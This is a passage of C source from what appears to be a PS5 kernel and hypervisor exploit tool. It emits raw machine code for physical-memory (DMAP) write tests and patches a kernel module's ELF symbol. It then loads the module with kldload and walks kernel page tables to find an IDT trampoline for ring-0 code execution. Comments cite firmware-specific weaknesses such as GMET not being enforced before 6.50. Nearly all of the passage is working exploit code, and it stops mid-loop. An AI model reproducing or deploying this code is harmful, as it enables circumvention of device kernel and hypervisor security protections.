    EMIT(0x0F); EMIT(0xB6); EMIT(0xC9);
    /* mov %ecx, 56(%rdi) — store test1_ok */
    EMIT(0x89); EMIT(0x4F); EMIT(0x38);

    /* ═══ Test 2: Cross-type write (slot0 → slot2) ═══ */
    /* Reload slot0 value from buf[40] (RDX still has original) */
    /* mov 40(%rdi), %rax */
    EMIT(0x48); EMIT(0x8B); EMIT(0x47); EMIT(0x28);
    /* mov %rax, (%rsi) — write slot0 value into slot2 via DMAP */
    EMIT(0x48); EMIT(0x89); EMIT(0x06);
    /* mfence */
    EMIT(0x0F); EMIT(0xAE); EMIT(0xF0);
    /* mov (%rsi), %rcx — read back */
    EMIT(0x48); EMIT(0x8B); EMIT(0x0E);
    /* mov %rcx, 64(%rdi) — store test2_readback */
    EMIT(0x48); EMIT(0x89); EMIT(0x4F); EMIT(0x40);
    /* cmp %rax, %rcx */
    EMIT(0x48); EMIT(0x39); EMIT(0xC1);
    /* sete %cl */
    EMIT(0x0F); EMIT(0x94); EMIT(0xC1);
    /* movzbl %cl, %ecx */
    EMIT(0x0F); EMIT(0xB6); EMIT(0xC9);
    /* mov %ecx, 72(%rdi) — store test2_ok */
    EMIT(0x89); EMIT(0x4F); EMIT(0x48);

    /* ═══ Restore: Write original (RDX) back to slot2 ═══ */
    /* mov %rdx, (%rsi) — restore original value */
    EMIT(0x48); EMIT(0x89); EMIT(0x16);
    /* mfence */
    EMIT(0x0F); EMIT(0xAE); EMIT(0xF0);
    /* mov (%rsi), %rax — read back after restore */
    EMIT(0x48); EMIT(0x8B); EMIT(0x06);
    /* mov %rax, 80(%rdi) — store restore_readback */
    EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT(0x50);
    /* cmp %rdx, %rax */
    EMIT(0x48); EMIT(0x39); EMIT(0xD0);
    /* sete %cl */
    EMIT(0x0F); EMIT(0x94); EMIT(0xC1);
    /* movzbl %cl, %ecx */
    EMIT(0x0F); EMIT(0xB6); EMIT(0xC9);
    /* mov %ecx, 88(%rdi) — store restore_ok */
    EMIT(0x89); EMIT(0x4F); EMIT(0x58);

    /* ── Finalize ── */
    /* status = DONE: movl $2, 8(%rdi) */
    EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(2);

    /* mfence */
    EMIT(0x0F); EMIT(0xAE); EMIT(0xF0);

    /* xor %eax, %eax; ret */
    EMIT(0x31); EMIT(0xC0);
    EMIT(0xC3);

    #undef EMIT
    #undef EMIT_U32
    #undef EMIT_U64

    return p;
}

static void campaign_kmod_kldload(void) {
    printf("\n=============================================\n");
    printf("  Campaign 7: Kernel Module (kldload)\n");
    printf("=============================================\n\n");

    printf("[*] Kernel module (.ko) size: %lu bytes\n", KMOD_KO_SZ);

    if (!g_dmap_base) {
        printf("[-] No DMAP base available - cannot set up shared memory.\n");
        return;
    }

    /* Step 1: Allocate shared memory buffer for kmod output.
     * We allocate physically-contiguous direct memory and compute
     * its kernel VA via DMAP. The kmod writes results here. */
    printf("\n[*] Step 1: Allocating shared result buffer...\n");

    #define KMOD_RESULT_ALLOC_SIZE 0x4000  /* 16KB - plenty for 7200-byte struct */
    off_t result_phys = 0;
    void *result_vaddr = NULL;

    int ret = sceKernelAllocateDirectMemory(
        0, 0x180000000ULL,
        KMOD_RESULT_ALLOC_SIZE, 0x4000,
        SCE_KERNEL_WB_ONION,
        &result_phys
    );
    if (ret != 0) {
        printf("[-] sceKernelAllocateDirectMemory failed: 0x%x\n", ret);
        return;
    }

    ret = sceKernelMapDirectMemory(
        &result_vaddr, KMOD_RESULT_ALLOC_SIZE,
        SCE_KERNEL_PROT_CPU_RW,
        0, result_phys, 0x4000
    );
    if (ret != 0) {
        printf("[-] sceKernelMapDirectMemory failed: 0x%x\n", ret);
        return;
    }

    memset(result_vaddr, 0, KMOD_RESULT_ALLOC_SIZE);

    /*
     * The PA from sceKernelAllocateDirectMemory is a PS5 bus address,
     * NOT a CPU physical address. DMAP maps CPU physical addresses.
     * Walk the page tables to find the actual CPU PA backing our mapping.
     */
    uint64_t cpu_pa = va_to_cpu_pa((uint64_t)result_vaddr);
    printf("[+] Result buffer: userland VA=0x%lx\n", (unsigned long)result_vaddr);
    printf("    Direct memory PA: 0x%lx (PS5 bus address)\n", (unsigned long)result_phys);
    printf("    CPU physical PA:  0x%lx (from page table walk)\n", (unsigned long)cpu_pa);

    if (cpu_pa == 0) {
        printf("[-] Page table walk failed - cannot resolve CPU physical address.\n");
        return;
    }

    uint64_t result_kva = g_dmap_base + cpu_pa;
    printf("    DMAP kernel VA:   0x%lx\n", (unsigned long)result_kva);

    /* Verify: write a test pattern via userland, read via kernel_copyout */
    volatile uint64_t *test_ptr = (volatile uint64_t *)result_vaddr;
    *test_ptr = 0xBEEFCAFE12345678ULL;
    uint64_t verify;
    kernel_copyout(result_kva, &verify, sizeof(verify));
    printf("[*] DMAP verify: wrote 0xbeefcafe12345678, read back 0x%lx %s\n",
           (unsigned long)verify,
           verify == 0xBEEFCAFE12345678ULL ? "[OK]" : "[MISMATCH]");
    *test_ptr = 0; /* Clear test pattern */

    if (verify != 0xBEEFCAFE12345678ULL) {
        printf("[-] DMAP address verification failed!\n");
        printf("    The page table walk may have returned an incorrect PA.\n");
        return;
    }

    /* ── Step 2: Patch g_output_kva in .ko with result buffer KVA ──
     *
     * On PS5 FW 4.03 the kernel linker DOES load module code/data into
     * dynamically-allocated kernel memory (confirmed by trampoline scanner
     * finding and executing hv_idt_trampoline via IDT hook).  GMET is not
     * enforced until FW 6.50, so this memory is NPT-executable.
     *
     * The kernel linker does NOT process SYSINIT or MOD_LOAD, so we use
     * the IDT hook path (Step 4b) to invoke hv_init manually.
     *
     * Phase 9 depends on gp_handler living in this NPT-executable KLD
     * .text memory — kdata cave is NX under NPT. */

    /* Copy .ko to modifiable buffer */
    void *ko_buf = malloc((size_t)KMOD_KO_SZ);
    if (!ko_buf) {
        printf("[-] malloc failed for .ko copy\n");
        return;
    }
    memcpy(ko_buf, KMOD_KO, (size_t)KMOD_KO_SZ);

    /*
     * Patch g_output_kva by parsing the ELF symbol table.
     *
     * The sentinel value 0xDEAD000000000000 appears TWICE in the .ko:
     *   1. In .text as a MOV immediate (comparison constant)
     *   2. In .data as g_output_kva's initial value
     * A byte-scan would patch the wrong copy (#1), corrupting the
     * comparison and leaving g_output_kva unchanged. So we parse the
     * ET_REL ELF symbol table to find g_output_kva precisely.
     */
    int patched = 0;
    uint8_t *ko_bytes = (uint8_t *)ko_buf;

    /* Minimal ELF64 structures for symbol lookup */
    typedef struct {
        unsigned char e_ident[16];
        uint16_t e_type, e_machine;
        uint32_t e_version;
        uint64_t e_entry, e_phoff, e_shoff;
        uint32_t e_flags;
        uint16_t e_ehsize, e_phentsize, e_phnum;
        uint16_t e_shentsize, e_shnum, e_shstrndx;
    } Elf64_Ehdr_t;

    typedef struct {
        uint32_t sh_name, sh_type;
        uint64_t sh_flags, sh_addr, sh_offset, sh_size;
        uint32_t sh_link, sh_info;
        uint64_t sh_addralign, sh_entsize;
    } Elf64_Shdr_t;

    typedef struct {
        uint32_t st_name;
        uint8_t  st_info, st_other;
        uint16_t st_shndx;
        uint64_t st_value, st_size;
    } Elf64_Sym_t;

    #define SHT_SYMTAB 2

    Elf64_Ehdr_t *ehdr = (Elf64_Ehdr_t *)ko_bytes;

    if (ehdr->e_shoff && ehdr->e_shnum > 0) {
        Elf64_Shdr_t *shdrs = (Elf64_Shdr_t *)(ko_bytes + ehdr->e_shoff);

        /* Find .symtab */
        Elf64_Shdr_t *symtab_sh = NULL;
        for (uint16_t i = 0; i < ehdr->e_shnum; i++) {
            if (shdrs[i].sh_type == SHT_SYMTAB) {
                symtab_sh = &shdrs[i];
                break;
            }
        }

        if (symtab_sh) {
            Elf64_Sym_t *syms = (Elf64_Sym_t *)(ko_bytes + symtab_sh->sh_offset);
            uint64_t nsyms = symtab_sh->sh_size / sizeof(Elf64_Sym_t);
            char *strtab = (char *)(ko_bytes + shdrs[symtab_sh->sh_link].sh_offset);

            for (uint64_t i = 0; i < nsyms; i++) {
                if (strcmp(strtab + syms[i].st_name, "g_output_kva") == 0) {
                    uint16_t shndx = syms[i].st_shndx;
                    if (shndx < ehdr->e_shnum) {
                        uint64_t file_off = shdrs[shndx].sh_offset + syms[i].st_value;
                        if (file_off + 8 <= (size_t)KMOD_KO_SZ) {
                            uint64_t cur;
                            memcpy(&cur, ko_bytes + file_off, 8);
                            printf("[+] ELF sym g_output_kva: section=%u, "
                                   "file_offset=0x%lx, current=0x%lx\n",
                                   shndx, (unsigned long)file_off,
                                   (unsigned long)cur);
                            memcpy(ko_bytes + file_off, &result_kva, 8);
                            printf("[+] Patched g_output_kva -> 0x%lx\n",
                                   (unsigned long)result_kva);
                            patched = 1;
                        }
                    }
                    break;
                }
            }
        }
    }

    /* Fallback: if ELF parsing failed, patch the LAST sentinel occurrence
     * (the first is in .text as an immediate, the last is in .data) */
    if (!patched) {
        printf("[!] ELF symbol lookup failed, falling back to byte scan...\n");
        size_t last_offset = (size_t)-1;
        for (size_t i = 0; i + 8 <= (size_t)KMOD_KO_SZ; i++) {
            uint64_t val;
            memcpy(&val, &ko_bytes[i], 8);
            if (val == OUTPUT_KVA_SENTINEL)
                last_offset = i;
        }
        if (last_offset != (size_t)-1) {
            memcpy(&ko_bytes[last_offset], &result_kva, 8);
            printf("[+] Patched LAST sentinel at .ko offset 0x%zx -> 0x%lx\n",
                   last_offset, (unsigned long)result_kva);
            patched = 1;
        }
    }

    if (!patched) {
        printf("[-] Could not find g_output_kva in .ko!\n");
        free(ko_buf);
        return;
    }

    /* Write patched .ko to disk */
    FILE *ko = fopen("/data/etaHEN/hv_kmod.ko", "wb");
    if (!ko) {
        printf("[-] Failed to create /data/etaHEN/hv_kmod.ko: %s\n", strerror(errno));
        free(ko_buf);
        return;
    }

    size_t written = fwrite(ko_buf, 1, (size_t)KMOD_KO_SZ, ko);
    fclose(ko);
    free(ko_buf);

    if (written != (size_t)KMOD_KO_SZ) {
        printf("[-] Short write: %zu/%lu bytes\n", written, KMOD_KO_SZ);
        unlink("/data/etaHEN/hv_kmod.ko");
        return;
    }
    printf("[+] Wrote patched hv_kmod.ko (%zu bytes)\n", written);

    /* ── Step 3: Load the kernel module via kldload(2) ──
     *
     * On PS5 FW 4.03, kldload allocates kernel memory, copies module
     * code/data, and handles R_X86_64_PC32 relocations.  It does NOT
     * process SYSINIT/MOD_LOAD, so hv_init won't run automatically —
     * we invoke it manually via IDT hook in Step 4b.
     *
     * The loaded .text pages are NPT-executable (GMET not enforced on
     * FW < 6.50), which is critical for Phase 9's gp_handler. */
    printf("\n[*] Step 3: Loading kernel module via kldload...\n");
    int kid = syscall(SYS_kldload, "/data/etaHEN/hv_kmod.ko");
    if (kid < 0) {
        printf("[-] kldload failed: errno=%d (%s)\n", errno, strerror(errno));
        printf("    Continuing with scanner — module may still be in memory.\n");
        kid = 0;
    } else {
        printf("[+] kldload returned kid=%d\n", kid);
    }

    struct kld_file_stat kfs;
    memset(&kfs, 0, sizeof(kfs));

    /* Try kldstat to get module base address (may be broken on PS5) */
    if (kid > 0) {
        kfs.version = sizeof(kfs);
        int ks_ret = syscall(SYS_kldstat, kid, &kfs);
        if (ks_ret == 0 && kfs.address != 0) {
            printf("[+] kldstat: base=0x%lx size=0x%lx name=%s\n",
                   (unsigned long)(uintptr_t)kfs.address,
                   (unsigned long)kfs.size, kfs.name);
        } else {
            printf("[*] kldstat returned %d (address=0x%lx) — will scan for module.\n",
                   ks_ret, (unsigned long)(uintptr_t)kfs.address);
        }
    }

    /* Step 4: Read results directly from shared buffer.
     * The kmod's hv_init wrote results to result_kva (DMAP-mapped).
     * Since we have result_vaddr mapped to the same physical memory,
     * we can read the results directly - no kldsym/kernel_copyout needed! */
    printf("\n[*] Step 4: Reading results from shared buffer...\n");

    struct kmod_result_buf *results = (struct kmod_result_buf *)result_vaddr;

    printf("    First 64 bytes of shared buffer:\n      ");
    uint8_t *rp = (uint8_t *)result_vaddr;
    for (int i = 0; i < 64; i++) {
        printf("%02x ", rp[i]);
        if (i % 16 == 15) printf("\n      ");
    }
    printf("\n");

    /* Check for pre-campaign canary (0xAAAABBBBCCCCDDDD) at buffer start.
     * This is written by hv_init BEFORE campaigns run. If present,
     * it means hv_init ran and g_output_kva was correct, but the full
     * results weren't copied (campaign crash or copy skipped). */
    uint64_t first_qword;
    memcpy(&first_qword, (void *)result_vaddr, sizeof(first_qword));

    /* ── Step 4a: Poll for deferred SYSINIT ──
     *
     * PS5's kernel linker defers SYSINIT processing — the shared buffer
     * may be empty immediately after kldload but populate later (during
     * a context switch, timer tick, or soft interrupt).  Poll briefly
     * to give SYSINIT time to fire before falling back to the scanner. */
    if (first_qword == 0) {
        printf("\n[*] Step 4a: Buffer empty — polling for deferred SYSINIT...\n");
        fflush(stdout);
        for (int poll = 0; poll < 40; poll++) {
            usleep(50000);  /* 50ms per poll, 2s total max */
            memcpy(&first_qword, (void *)result_vaddr, sizeof(first_qword));
            if (first_qword != 0) {
                printf("[+] SYSINIT fired after %dms! first_qword=0x%016llx\n",
                       (poll + 1) * 50, (unsigned long long)first_qword);
                break;
            }
        }
        if (first_qword == 0) {
            printf("    SYSINIT did not fire within 2s — continuing with scanner.\n");
        }
    }

    /* ── Step 4b: Get KLD addresses ──
     *
     * If SYSINIT fired (first_qword != 0), check the result buffer for
     * function addresses.  The kmod uses RIP-relative LEA to compute
     * addresses (avoiding R_X86_64_64 relocations that PS5 doesn't resolve).
     *
     * If SYSINIT didn't fire (first_qword == 0), fall through to the
     * scanner which tries to find the module in kernel memory via DMAP.
     * The scanner may fail if module pages are NPT-protected against
     * DMAP reads (confirmed on FW 4.03).
     *
     * If neither approach yields addresses, Phase 9 falls back to the
     * inline handler in an NPT-executable kdata cave (proven to work
     * via ring-0 code execution testing). */
    {
        int need_idt_invoke = (first_qword == 0);
        int got_addrs_from_buffer = 0;

        /* If SYSINIT fired and result buffer has KMOD_MAGIC, try extracting
         * addresses directly — this avoids the scanner entirely. */
        if (!need_idt_invoke && results->magic == KMOD_MAGIC) {
            printf("\n[*] Step 4b: SYSINIT fired with KMOD_MAGIC — checking result buffer addresses...\n");

            if (results->gp_handler_kva != 0 &&
                results->trampoline_func_kva != 0 &&
                results->trampoline_target_kva != 0) {
                g_kmod_gp_handler = results->gp_handler_kva;
                g_kmod_trampoline_func = results->trampoline_func_kva;
                g_kmod_trampoline_target = results->trampoline_target_kva;
                g_kmod_kid = kid;
                got_addrs_from_buffer = 1;

                printf("[+] Got KLD addresses from result buffer (RIP-relative LEA):\n");
                printf("    gp_handler()            = 0x%016lx\n",
                       (unsigned long)g_kmod_gp_handler);
                printf("    trampoline_xapic_mode() = 0x%016lx\n",
                       (unsigned long)g_kmod_trampoline_func);
                printf("    g_trampoline_target     = 0x%016lx\n",
                       (unsigned long)g_kmod_trampoline_target);
                printf("[+] Scanner bypassed — addresses obtained directly from kmod.\n");
                goto idt_done;
            } else {
                printf("    Result buffer addresses still zero (R_X86_64_64 unresolved?).\n");
                printf("    gp_handler=0x%lx  trampoline_func=0x%lx  trampoline_target=0x%lx\n",
                       (unsigned long)results->gp_handler_kva,
                       (unsigned long)results->trampoline_func_kva,
                       (unsigned long)results->trampoline_target_kva);
                printf("    Falling through to scanner...\n");
            }
        }

        if (need_idt_invoke) {
            printf("\n[*] Step 4b: SYSINIT/MOD_LOAD did not fire — scanner + IDT invocation...\n");
        } else if (!got_addrs_from_buffer) {
            printf("\n[*] Step 4b: SYSINIT fired but addresses unavailable — scanning...\n");
        }

        /* ── 4b-1: Locate hv_idt_trampoline in kernel memory ── */

        /* Machine code signature of hv_idt_trampoline.
         * The function is: push rax..r11, xor edi,edi, call hv_init,
         * pop r11..rax, iretq.  We match the prefix and suffix around
         * the 5-byte relative call (which varies after relocation). */
        static const uint8_t tramp_prefix[] = {
            0x50, 0x51, 0x52, 0x56, 0x57,               /* push rax,rcx,rdx,rsi,rdi */
            0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, /* push r8,r9,r10,r11 */
            0x31, 0xff                                   /* xor edi,edi */
        };
        static const uint8_t tramp_suffix[] = {
            0x41, 0x5b, 0x41, 0x5a, 0x41, 0x59, 0x41, 0x58, /* pop r11,r10,r9,r8 */
            0x5f, 0x5e, 0x5a, 0x59, 0x58,               /* pop rdi,rsi,rdx,rcx,rax */
            0x48, 0xcf                                   /* iretq */
        };
        const int suffix_off = 0x14;  /* offset of suffix within trampoline */

        printf("[*] g_kdata_base=0x%lx  g_ktext_base=0x%lx  g_dmap_base=0x%lx\n",
               (unsigned long)g_kdata_base, (unsigned long)g_ktext_base,
               (unsigned long)g_dmap_base);

        /* ── kldstat-directed check ──
         * If kldstat reported a module base address, try reading directly
         * from there first (saves the expensive full scan). */
        uint64_t trampoline_kva = 0;
        uint8_t hdr[256];

        if (kfs.address != 0) {
            printf("[*] Trying kldstat-reported base 0x%lx...\n",
                   (unsigned long)kfs.address);
            uint64_t mod_pa = va_to_pa_quiet(kfs.address);
            if (mod_pa != 0) {
                /* Read via DMAP to avoid XOM issues */
                if (kernel_copyout(g_dmap_base + mod_pa, hdr, sizeof(hdr)) == 0) {
                    printf("    First 16 bytes: ");
                    for (int i = 0; i < 16; i++) printf("%02x ", hdr[i]);
                    printf("\n");
                    if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
                        memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
                        trampoline_kva = kfs.address;
                        printf("[+] Trampoline found at kldstat base 0x%lx!\n",
                               (unsigned long)trampoline_kva);
                    }
                }
            } else {
                printf("    Page not mapped in kernel page table.\n");
            }
        }

        /* ── DMAP readability test for ktext (XOM diagnostic) ── */
        if (trampoline_kva == 0) {
            uint64_t kt_pa = va_to_pa_quiet(g_ktext_base);
            if (kt_pa != 0) {
                uint8_t kt_hdr[16];
                int kt_ok = kernel_copyout(g_dmap_base + kt_pa, kt_hdr, 16);
                printf("[*] XOM test: ktext PA=0x%lx, DMAP read %s, bytes: ",
                       (unsigned long)kt_pa, kt_ok == 0 ? "OK" : "FAIL");
                if (kt_ok == 0)
                    for (int i = 0; i < 16; i++) printf("%02x ", kt_hdr[i]);
                printf("\n");
            }
        }

        /* ── XOM-safe FAST hierarchical scan ──
         *
         * We CANNOT kernel_copyout arbitrary kernel VAs (XOM pages cause
         * NPT fault → kernel panic).  Instead we walk the page tables
         * via DMAP and read page content via DMAP.
         *
         * For speed we walk the 4-level page tables hierarchically:
         *   - Skip unmapped 512GB regions (PML4 not present)
         *   - Skip unmapped 1GB regions   (PDPT not present)
         *   - Skip unmapped 2MB regions   (PD not present)
         *   - For mapped 2MB: bulk-read the PT page (512 entries, 4KB)
         *     in ONE kernel_copyout, then iterate locally
         *
         * This turns ~1M kernel_copyouts into ~500 for a mostly-unmapped
         * 1GB range.
         */

        uint64_t total_2mb_checked = 0, total_2mb_mapped = 0;
        uint64_t total_pages_mapped = 0;

        /* Scan ranges — ordered by likelihood for PS5 kmod allocation.
         *
         * The hierarchical page-table walker skips unmapped 512GB/1GB/2MB
         * regions in a single kernel_copyout, so even huge VA ranges are
         * fast when most entries are not present.
         *
         * SAFETY: Ranges 2 and 3 are capped to 1GB to avoid reading
         * physical addresses beyond PS5's 16GB RAM.  Uncapped ranges
         * hit MMIO space via DMAP → kernel panic. */
        struct { uint64_t start, end; const char *label; } ranges[4];
        int nranges = 0;

        /* Range 1: kdata → end of VA space (includes BSS, heap, modules)
         * Cap at FFE00000 to prevent 2MB-aligned scan overflow. */
        {
            uint64_t s = g_kdata_base;
            uint64_t e = 0xFFFFFFFFFFE00000ULL;
            if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "kdata→top"}; }
        }
        /* Range 2: DMAP end → kernel text (capped to last 1GB) */
        {
            uint64_t s = g_dmap_base + 0x200000000ULL;
            uint64_t e = g_ktext_base;
            if (e > s && e - s > 0x40000000ULL) s = e - 0x40000000ULL;
            if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "DMAP→ktext gap"}; }
        }
        /* Range 3: below DMAP (capped to last 1GB) */
        {
            uint64_t s = 0xFFFF800000000000ULL;
            uint64_t e = g_dmap_base;
            if (e > s && e - s > 0x40000000ULL) s = e - 0x40000000ULL;
            if (s < e) { ranges[nranges++] = (typeof(ranges[0])){s, e, "below DMAP"}; }
        }

        for (int ri = 0; ri < nranges && trampoline_kva == 0; ri++) {
            uint64_t rs = ranges[ri].start, re = ranges[ri].end;
            printf("[*] Scan %d/%d (%s): 0x%lx → 0x%lx (%luMB)\n",
                   ri + 1, nranges, ranges[ri].label,
                   (unsigned long)rs, (unsigned long)re,
                   (unsigned long)((re - rs) >> 20));
            fflush(stdout);

            uint64_t skipped_mmio = 0;

            /* Safe 2MB advance: set va=re on overflow so loop exits */
            #define VA_NEXT_2MB(va, re) do { \
                uint64_t _old = (va); (va) += (1ULL << 21); \
                if ((va) <= _old) (va) = (re); \
            } while (0)

            /* Walk page tables hierarchically, 2MB at a time */
            uint64_t va = rs & ~0x1FFFFFULL; /* align down to 2MB */

            for (; va < re && trampoline_kva == 0; ) {
                /* Progress every 100 2MB chunks */
                if (total_2mb_checked > 0 && (total_2mb_checked % 100) == 0) {
                    printf("    ...%lu chunks, %lu mapped, %lu pages, "
                           "%lu mmio-skipped (VA=0x%lx)\r",
                           (unsigned long)total_2mb_checked,
                           (unsigned long)total_2mb_mapped,
                           (unsigned long)total_pages_mapped,
                           (unsigned long)skipped_mmio,
                           (unsigned long)va);
                    fflush(stdout);
                }

                /* --- PML4 (512GB granularity) --- */
                uint64_t pml4e;
                kernel_copyout(g_dmap_base + g_cr3_phys +
                               ((va >> 39) & 0x1FF) * 8, &pml4e, 8);
                if (!(pml4e & PTE_PRESENT)) {
                    uint64_t next = (va + (1ULL << 39)) & ~((1ULL << 39) - 1);
                    if (next <= va) break; /* overflow */
                    va = next;
                    continue;
                }

                /* --- PDPT (1GB granularity) --- */
                uint64_t pdpt_pa = pml4e & PTE_PA_MASK;
                if (pdpt_pa >= MAX_SAFE_PA) {
                    skipped_mmio++;
                    uint64_t next = (va + (1ULL << 30)) & ~((1ULL << 30) - 1);
                    if (next <= va) break;
                    va = next;
                    continue;
                }
                uint64_t pdpte;
                kernel_copyout(g_dmap_base + pdpt_pa +
                               ((va >> 30) & 0x1FF) * 8, &pdpte, 8);
                if (!(pdpte & PTE_PRESENT)) {
                    uint64_t next = (va + (1ULL << 30)) & ~((1ULL << 30) - 1);
                    if (next <= va) break;
                    va = next;
                    continue;
                }
                if (pdpte & PTE_PS) {
                    /* 1GB huge page (typically DMAP itself) — skip */
                    uint64_t next = (va + (1ULL << 30)) & ~((1ULL << 30) - 1);
                    if (next <= va) break;
                    va = next;
                    continue;
                }

                /* --- PD (2MB granularity) --- */
                uint64_t pd_pa = pdpte & PTE_PA_MASK;
                if (pd_pa >= MAX_SAFE_PA) {
                    skipped_mmio++;
                    VA_NEXT_2MB(va, re);
                    continue;
                }
                uint64_t pde;
                kernel_copyout(g_dmap_base + pd_pa +
                               ((va >> 21) & 0x1FF) * 8, &pde, 8);
                total_2mb_checked++;

                if (!(pde & PTE_PRESENT)) {
                    VA_NEXT_2MB(va, re);
                    continue;
                }

                if (pde & PTE_PS) {
                    /* 2MB huge page — scan each 4KB offset */
                    total_2mb_mapped++;
                    uint64_t base_pa = pde & 0x000FFFFFFFE00000ULL;
                    if (base_pa >= MAX_SAFE_PA) {
                        skipped_mmio++;
                        VA_NEXT_2MB(va, re);
                        continue;
                    }
                    uint64_t chunk_start = va & ~0x1FFFFFULL;
                    for (int pi = 0; pi < 512 && trampoline_kva == 0; pi++) {
                        uint64_t page_va = chunk_start + (uint64_t)pi * 0x1000;
                        if (page_va < rs || page_va >= re) continue;
                        total_pages_mapped++;
                        uint64_t pa = base_pa + (uint64_t)pi * 0x1000;
                        if (pa >= MAX_SAFE_PA) { skipped_mmio++; continue; }
                        if (kernel_copyout(g_dmap_base + pa, hdr, sizeof(hdr)) != 0)
                            continue;
                        if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
                            memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
                            trampoline_kva = page_va;
                        }
                    }
                    VA_NEXT_2MB(va, re);
                    continue;
                }

                /* --- PT: bulk-read 512 entries (4KB) in ONE kernel_copyout --- */
                uint64_t pt_pa = pde & PTE_PA_MASK;
                if (pt_pa >= MAX_SAFE_PA) {
                    skipped_mmio++;
                    VA_NEXT_2MB(va, re);
                    continue;
                }
                total_2mb_mapped++;
                uint64_t pt_entries[512];
                kernel_copyout(g_dmap_base + pt_pa,
                               pt_entries, sizeof(pt_entries));

                uint64_t chunk_start = va & ~0x1FFFFFULL;
                for (int pi = 0; pi < 512 && trampoline_kva == 0; pi++) {
                    uint64_t page_va = chunk_start + (uint64_t)pi * 0x1000;
                    if (page_va < rs || page_va >= re) continue;
                    if (!(pt_entries[pi] & PTE_PRESENT)) continue;
                    total_pages_mapped++;

                    uint64_t pa = pt_entries[pi] & PTE_PA_MASK;
                    if (pa >= MAX_SAFE_PA) { skipped_mmio++; continue; }
                    if (kernel_copyout(g_dmap_base + pa, hdr, sizeof(hdr)) != 0)
                        continue;
                    if (memcmp(hdr, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
                        memcmp(hdr + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
                        trampoline_kva = page_va;
                    }
                }
                VA_NEXT_2MB(va, re);
            }

            printf("    2MB chunks: %lu checked, %lu mapped; pages: %lu mapped"
                   " (mmio-skipped: %lu)\n",
                   (unsigned long)total_2mb_checked,
                   (unsigned long)total_2mb_mapped,
                   (unsigned long)total_pages_mapped,
                   (unsigned long)skipped_mmio);
        }

        if (trampoline_kva) {
            printf("[+] FOUND trampoline at VA 0x%lx (page-start)!\n",
                   (unsigned long)trampoline_kva);
            printf("    bytes: ");
            for (int b = 0; b < 58; b++) printf("%02x ", hdr[b]);
            printf("\n");
        }

        /* Fallback: full-page scan (trampoline at non-zero page offset).
         *
         * The primary scanner only checks the first 64 bytes of each page.
         * On PS5 FW 4.03, the kernel linker may place module .text at a
         * non-zero offset within the allocation page (e.g., after ELF
         * metadata or section padding).
         *
         * This re-walks Range 1 (kdata→top, known safe) reading full
         * 4096-byte pages and searching for the trampoline at every byte.
         * ~35K pages × 4KB = ~140MB of reads — takes < 1 second. */
        if (trampoline_kva == 0 && nranges >= 1) {
            printf("[*] Full-page scan: searching for trampoline at any page offset...\n");
            fflush(stdout);

            /* Only scan Range 1 (kdata→top) — safe, no MMIO risk */
            uint64_t rs = ranges[0].start, re = ranges[0].end;
            uint64_t va = rs & ~0x1FFFFFULL;
            uint64_t fp_pages = 0;
            uint8_t full_page[4096];

            for (; va < re && trampoline_kva == 0; ) {
                uint64_t pml4e;
                kernel_copyout(g_dmap_base + g_cr3_phys +
                               ((va >> 39) & 0x1FF) * 8, &pml4e, 8);
                if (!(pml4e & PTE_PRESENT)) {
                    uint64_t n = (va + (1ULL<<39)) & ~((1ULL<<39)-1);
                    if (n <= va) break; va = n; continue;
                }
                uint64_t pdpt_pa = pml4e & PTE_PA_MASK;
                if (pdpt_pa >= MAX_SAFE_PA) {
                    uint64_t n = (va + (1ULL<<30)) & ~((1ULL<<30)-1);
                    if (n <= va) break; va = n; continue;
                }
                uint64_t pdpte;
                kernel_copyout(g_dmap_base + pdpt_pa +
                               ((va >> 30) & 0x1FF) * 8, &pdpte, 8);
                if (!(pdpte & PTE_PRESENT) || (pdpte & PTE_PS)) {
                    uint64_t n = (va + (1ULL<<30)) & ~((1ULL<<30)-1);
                    if (n <= va) break; va = n; continue;
                }
                uint64_t pd_pa = pdpte & PTE_PA_MASK;
                if (pd_pa >= MAX_SAFE_PA) { VA_NEXT_2MB(va, re); continue; }
                uint64_t pde;
                kernel_copyout(g_dmap_base + pd_pa +
                               ((va >> 21) & 0x1FF) * 8, &pde, 8);
                if (!(pde & PTE_PRESENT)) { VA_NEXT_2MB(va, re); continue; }

                if (pde & PTE_PS) {
                    /* 2MB large page */
                    uint64_t base_pa = pde & 0x000FFFFFFFE00000ULL;
                    if (base_pa >= MAX_SAFE_PA) { VA_NEXT_2MB(va, re); continue; }
                    uint64_t chunk_start = va & ~0x1FFFFFULL;
                    for (int pi = 0; pi < 512 && trampoline_kva == 0; pi++) {
                        uint64_t page_va = chunk_start + (uint64_t)pi * 0x1000;
                        if (page_va < rs || page_va >= re) continue;
                        uint64_t pa = base_pa + (uint64_t)pi * 0x1000;
                        if (pa >= MAX_SAFE_PA) continue;
                        if (kernel_copyout(g_dmap_base + pa, full_page, 4096) != 0) continue;
                        fp_pages++;
                        /* Search for trampoline prefix at every byte offset */
                        int max_off = 4096 - (int)sizeof(tramp_prefix);
                        if (max_off > 4096 - suffix_off - (int)sizeof(tramp_suffix))
                            max_off = 4096 - suffix_off - (int)sizeof(tramp_suffix);
                        for (int off = 0; off <= max_off; off++) {
                            if (memcmp(full_page + off, tramp_prefix, sizeof(tramp_prefix)) == 0 &&
                                memcmp(full_page + off + suffix_off, tramp_suffix, sizeof(tramp_suffix)) == 0) {
                                trampoline_kva = page_va + off;
                                /* Copy 64 bytes starting from the trampoline into hdr */
                                int avail = 4096 - off;
                                if (avail > (int)sizeof(hdr)) avail = (int)sizeof(hdr);
                                memcpy(hdr, full_page + off, avail);
                                printf("[+] FOUND trampoline at VA 0x%lx (page offset 0x%x)!\n",
                                       (unsigned long)trampoline_kva, off);
                                printf("    bytes: ");
                                for (int b = 0; b < (avail < 58 ? avail : 58); b++)
                                    printf("%02x ", hdr[b]);
                                printf("\n");
                                break;
                            }
                        }
